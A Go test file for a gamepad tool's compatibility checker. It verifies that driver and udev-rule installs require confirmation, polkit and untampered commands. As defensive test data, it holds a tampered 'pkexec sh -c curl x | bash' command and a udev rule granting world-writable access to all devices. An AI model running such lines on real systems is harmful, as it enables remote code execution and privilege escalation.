package compat

import (
	"errors"
	"os"
	"path/filepath"
	"testing"

	"github.com/Phobby/TuiSense/internal/device"
	"github.com/Phobby/TuiSense/internal/drivers/dualsense"
	"github.com/Phobby/TuiSense/internal/drivers/gamepad"
	"github.com/Phobby/TuiSense/internal/drivers/msigc20"
	"github.com/Phobby/TuiSense/internal/drivers/padmodels"
	"github.com/Phobby/TuiSense/internal/system/evdev"
)

type fakeEnv struct {
	goos     string
	modules  map[string]bool
	files    map[string]bool
	writable map[string]bool
	pkexec   bool
}

func (e fakeEnv) GOOS() string                  { return e.goos }
func (e fakeEnv) ModuleLoaded(name string) bool { return e.modules[name] }
func (e fakeEnv) Writable(p string) bool        { return e.writable[p] }
func (e fakeEnv) Exists(p string) bool          { return e.files[p] }
func (e fakeEnv) LookPath(name string) (string, error) {
	if name == "pkexec" && e.pkexec {
		return "/usr/bin/pkexec", nil
	}
	return "", errors.New("not found")
}

type recorder struct{ runs [][]string }

func (r *recorder) Run(argv []string) error { r.runs = append(r.runs, argv); return nil }

func linux() fakeEnv { return fakeEnv{goos: "linux", pkexec: true} }

func checkIDs(r Report) map[string]Check {
	out := map[string]Check{}
	for _, c := range r.Checks {
		out[c.ID] = c
	}
	return out
}

func TestWorkingControllerGetsNoDriverActions(t *testing.T) {
	desc := msigc20.Describe(gamepad.Mapping{}, evdev.InputDevice{}, gamepad.RuntimeWith(true))
	r := Analyze(linux(), Input{Desc: desc, Caps: desc.Capabilities, Info: device.Info{Connected: true, Connection: device.ConnUSBWired, KernelDriver: "xpad"}})
	c := checkIDs(r)
	if c["input"].Level != LevelOK || c["vibration"].Level != LevelOK || c["os_driver"].Level != LevelOK {
		t.Fatalf("a working MSI pad must report OK: %+v", r.Checks)
	}
	if len(r.Actions) != 0 {
		t.Fatalf("nothing to install for a working controller, got %+v", r.Actions)
	}
	for _, id := range []string{"battery", "audio", "rear"} {
		if _, ok := c[id]; ok {
			t.Fatalf("the GC20 V2 has no %s; it must not be mentioned", id)
		}
	}
}

func TestXboxBluetoothWithoutRumbleSuggestsXpadneoManually(t *testing.T) {
	d := evdev.InputDevice{Vendor: 0x045e, Product: 0x0b13, Bus: evdev.BusBluetooth}
	rt := gamepad.Runtime{Readable: true, Conn: device.ConnBluetooth}
	desc := padmodels.XboxSeries.Describe(gamepad.Mapping{}, d, rt)
	r := Analyze(linux(), Input{Desc: desc, Caps: desc.Capabilities, Info: device.Info{Connected: true, Connection: device.ConnBluetooth, KernelDriver: "microsoft"}})
	a, ok := r.Action(ActionXpadneo)
	if !ok || !a.Manual || len(a.Commands) != 0 {
		t.Fatalf("xpadneo must be a manual suggestion, never executed: %+v", a)
	}
	if err := Execute(linux(), &recorder{}, a, true, nil); !errors.Is(err, ErrNotExecutable) {
		t.Fatalf("manual actions cannot run: %v", err)
	}
	// With rumble working, nothing is suggested.
	rt.Rumble, rt.RumbleFF = true, true
	desc = padmodels.XboxSeries.Describe(gamepad.Mapping{}, d, rt)
	r = Analyze(linux(), Input{Desc: desc, Caps: desc.Capabilities, Info: device.Info{Connected: true, Connection: device.ConnBluetooth, KernelDriver: "microsoft"}})
	if _, ok := r.Action(ActionXpadneo); ok {
		t.Fatal("a working driver must not be replaced")
	}
}

func TestPermissionErrorsAndGatedUdevInstall(t *testing.T) {
	t.Setenv("XDG_CACHE_HOME", t.TempDir())
	desc := dualsense.Descriptor()
	info := device.Info{Connected: true, Connection: device.ConnUSB, PermissionDenied: true, ReadOnly: true, HIDRawPath: "/dev/hidraw3"}
	r := Analyze(linux(), Input{Desc: desc, Caps: desc.Capabilities, Info: info})
	if checkIDs(r)["input"].Level != LevelMissing || r.Input != "No permission" {
		t.Fatalf("permission errors must be reported: %+v", r.Checks)
	}
	a, ok := r.Action(ActionUdevDualSense)
	if !ok || !a.Privileged || a.Manual || len(a.Rollback) == 0 {
		t.Fatalf("expected the reviewed udev action with rollback: %+v", a)
	}
	run := &recorder{}
	if err := Execute(linux(), run, a, false, nil); !errors.Is(err, ErrNotConfirmed) || len(run.runs) != 0 {
		t.Fatalf("nothing may run without confirmation: %v %v", err, run.runs)
	}
	// The staged rule must exist and be TuiSense's own rule.
	if err := Execute(linux(), run, a, true, nil); !errors.Is(err, ErrActionChanged) || len(run.runs) != 0 {
		t.Fatalf("an unstaged rule must be refused: %v", err)
	}
	if err := StageRule(); err != nil {
		t.Fatal(err)
	}
	tampered := a
	tampered.Commands = [][]string{{"pkexec", "sh", "-c", "curl x | bash"}, a.Commands[1]}
	if err := Execute(linux(), run, tampered, true, nil); !errors.Is(err, ErrActionChanged) || len(run.runs) != 0 {
		t.Fatalf("modified commands must be refused: %v", err)
	}
	other := a
	other.ID = "install_anything"
	if err := Execute(linux(), run, other, true, nil); !errors.Is(err, ErrUntrusted) {
		t.Fatalf("unknown actions must be refused: %v", err)
	}
	noPolkit := linux()
	noPolkit.pkexec = false
	if err := Execute(noPolkit, run, a, true, nil); !errors.Is(err, ErrNoPolkit) {
		t.Fatalf("without polkit there is no privileged path: %v", err)
	}
	if err := Execute(linux(), run, a, true, func() bool { return false }); !errors.Is(err, ErrVerifyFailed) {
		t.Fatalf("an unverified result must be reported: %v", err)
	}
	if len(run.runs) != 2 || run.runs[0][0] != "pkexec" || run.runs[0][5] != UdevRulePath {
		t.Fatalf("expected exactly the two reviewed commands, got %v", run.runs)
	}
	if err := os.Remove(filepath.Clean(StagedRulePath())); err != nil {
		t.Fatal(err)
	}
	// Tampering with the staged file after review is caught too.
	if err := os.WriteFile(StagedRulePath(), []byte("KERNEL==\"*\", MODE=\"0666\"\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := Execute(linux(), &recorder{}, a, true, nil); !errors.Is(err, ErrActionChanged) {
		t.Fatalf("a modified rule file must be refused: %v", err)
	}
	// Without polkit only manual instructions are offered.
	if r := Analyze(noPolkit, Input{Desc: desc, Caps: desc.Capabilities, Info: info}); len(r.Actions) != 1 || !r.Actions[0].Manual {
		t.Fatalf("expected a manual udev action: %+v", r.Actions)
	}
}

func TestEliteRearPaddlesExplainTheDriverRequirement(t *testing.T) {
	d := evdev.InputDevice{Vendor: 0x045e, Product: 0x0b22, Bus: evdev.BusBluetooth}
	desc := padmodels.XboxElite2.Describe(gamepad.Mapping{}, d, gamepad.Runtime{Rumble: true, RumbleFF: true, Readable: true, Conn: device.ConnBluetooth})
	r := Analyze(linux(), Input{Desc: desc, Caps: desc.Capabilities, Info: device.Info{Connected: true, Connection: device.ConnBluetooth, KernelDriver: "microsoft"}})
	c := checkIDs(r)["rear"]
	if c.ActionID != ActionEliteBPF {
		t.Fatalf("missing paddle explanation: %+v", r.Checks)
	}
	if a, _ := r.Action(ActionEliteBPF); !a.Manual {
		t.Fatal("kernel changes are manual only")
	}
}

func TestOtherPlatformsAndSimulatedDevices(t *testing.T) {
	desc := dualsense.Descriptor()
	r := Analyze(fakeEnv{goos: "darwin"}, Input{Desc: desc, Caps: desc.Capabilities, Info: device.Info{Connected: true}})
	if r.Supported || len(r.Actions) != 0 || r.OS != "macOS" {
		t.Fatalf("macOS has no backend and no actions: %+v", r)
	}
	r = Analyze(fakeEnv{goos: "windows"}, Input{Desc: desc, Caps: desc.Capabilities, Info: device.Info{Connected: true}})
	if !r.Supported || len(r.Actions) != 0 || r.OS != "Windows" {
		t.Fatalf("Windows uses XInput and never installs drivers: %+v", r)
	}
	r = Analyze(linux(), Input{Desc: desc, Caps: desc.Capabilities, Simulated: true})
	if r.Backend != "simulated" || len(r.Actions) != 0 {
		t.Fatalf("simulated devices need no drivers: %+v", r)
	}
}
